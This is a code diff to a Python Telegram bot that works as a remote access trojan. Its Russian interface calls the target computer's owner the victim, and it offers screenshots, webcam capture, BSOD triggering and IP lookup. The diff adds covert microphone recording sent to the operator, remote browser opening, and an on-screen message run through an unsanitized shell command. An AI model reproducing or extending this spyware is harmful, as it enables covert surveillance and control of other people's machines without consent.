@@ -10,10 +10,11 @@ import wave
 from moviepy.editor import *
 from telebot.types import Message
 import requests
-import easygui as eg
+import subprocess
+import webbrowser
 
 
-API = 'ТОКЕН'
+API = 'TOKEN'
 
 bot = telebot.TeleBot(API)
 
@@ -27,7 +28,9 @@ def create_inline_keyboard():
         telebot.types.InlineKeyboardButton('Вызвать BSOD', callback_data='bsod'),
         telebot.types.InlineKeyboardButton('Коннект к веб камере', callback_data='camera'),
         telebot.types.InlineKeyboardButton('Узнать IP компьютера', callback_data='get_ip'),
-        telebot.types.InlineKeyboardButton('Вывести СМС на экран ПК', callback_data='messcren')
+        telebot.types.InlineKeyboardButton('Вывести СМС на экран ПК', callback_data='messcren'),
+        telebot.types.InlineKeyboardButton('Загуглить на ПК', callback_data='google_search'),
+        telebot.types.InlineKeyboardButton('Перехват звука', callback_data='voice_record')
     )
     return keyboard
 
@@ -70,12 +73,12 @@ def record_audio(filename, duration=10):
 
     frames = []
 
-    print("Recording audio...")
+    print("Запись началась...")
     for _ in range(int(RATE / CHUNK * duration)):
         data = stream.read(CHUNK)
         frames.append(data)
 
-    print("Finished recording.")
+    print("Записи завершены.")
     stream.stop_stream()
     stream.close()
     audio.terminate()
@@ -88,6 +91,7 @@ def record_audio(filename, duration=10):
     wf.writeframes(b"".join(frames))
     wf.close()
 
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     bot.send_message(message.chat.id, 'Привет! Что вы хотите сделать?', reply_markup=create_inline_keyboard())
@@ -97,6 +101,18 @@ def send_screenshot(message):
     screenshot = ImageGrab.grab()
     screenshot.save(path, 'PNG')
     bot.send_photo(message.chat.id, open(path, 'rb'))
+
+
+def open_website(message: Message):
+    url = message.text
+    if url.startswith('http://') or url.startswith('https://'):
+        webbrowser.open(url)
+        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы со страницей: {url}')
+    else:
+        search_query = message.text
+        url = f"https://www.google.com/search?q={search_query}"
+        webbrowser.open(url)
+        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы с запросом: {search_query}')
 
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -117,9 +133,16 @@ def handle_callback_query(call):
     elif call.data == 'get_ip':
         bot.send_message(call.message.chat.id, 'Узнаю IP компьютера...')
         get_computer_ip(call.message)
+    elif call.data == 'voice_record':
+        bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать аудио (в секундах):')
+        bot.register_next_step_handler(call.message, record_audio_duration)
     elif call.data == 'messcren':
         bot.send_message(call.message.chat.id, 'Введите сообщение для отображения на экране жертвы:')
         bot.register_next_step_handler(call.message, show_messagebox)
+    elif call.data == 'google_search':
+        bot.send_message(call.message.chat.id, 'Введите запрос для поиска в Google или веб сайт:')
+        bot.register_next_step_handler(call.message, open_website)
+
     elif call.data == 'camera':
         bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать видео и аудио (в секундах):')
         bot.register_next_step_handler(call.message, start_video_and_audio_recording)
@@ -162,6 +185,33 @@ def start_video_and_audio_recording(message: Message):
     except ValueError:
         bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')
 
+def record_audio_duration(message: Message):
+    try:
+        duration = int(message.text)
+        if duration < 1:
+            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
+            return
+
+        bot.send_message(message.chat.id, f'Записываю звук в течение {duration} секунд...')
+
+        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))
+        audio_thread.start()
+        audio_thread.join()
+
+        bot.send_message(message.chat.id, 'Запись завершена. Отправляю...')
+
+        # Send the voice message to the user
+        bot.send_chat_action(message.chat.id, 'record_audio')
+        with open("temp_audio.wav", "rb") as audio_file:
+            bot.send_voice(message.chat.id, audio_file)
+
+        os.remove("temp_audio.wav")
+
+    except ValueError:
+        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')
+
+    
+
 def get_computer_ip(message):
     try:
         response = requests.get('https://api.ipify.org?format=json')
@@ -175,8 +225,11 @@ def get_computer_ip(message):
         bot.send_message(message.chat.id, 'Произошла ошибка при получении IP компьютера.')
 
 def show_messagebox(message: Message):
-    eg.msgbox(message.text, "Сообщение")
-    bot.send_message(message.chat.id, 'Сообщение было получено.\nВаша жертва закрыла окно с вашим сообщением и я вам об этом написал.')
+    # Using subprocess to show a message box
+    cmd = f'msg * "{message.text}"'
+    subprocess.run(cmd, shell=True)
+
+    bot.send_message(message.chat.id, 'Сообщение было получено.')
 
 
 
